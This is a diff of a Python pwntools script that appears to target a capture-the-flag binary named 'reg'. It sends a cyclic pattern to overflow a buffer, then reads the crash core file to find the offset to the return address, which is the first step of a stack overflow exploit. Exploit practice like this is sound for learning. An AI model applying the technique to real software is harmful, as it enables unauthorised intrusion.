@@ -12,9 +12,24 @@ log.info('Create IO')
 io = process('/home/kali/Downloads/reg')
 
 
+payload = cyclic(200)
 
-#log.info('Get Stack Address')
-#io.sendlineafter('(y/n): ', 'y')
+log.info('Send Payload')
+io.sendlineafter('name : ', payload)
+
+io.wait()
+
+core = io.corefile
+stack = core.rsp
+info("rsp = %#x", stack)
+pattern = core.read(stack, 4)
+info("cyclic pattern = %s", pattern.decode())
+rip_offset = cyclic_find(pattern)
+info("rip offset is = %d", rip_offset)
+
+io.interactive()
+
+
 #stack_address = io.recvline().decode().strip().split()[-1][2:]
 #stack_address = bytes.fromhex(stack_address).rjust(8, b'\x00')
 #stack_address = u64(stack_address, endian='big')
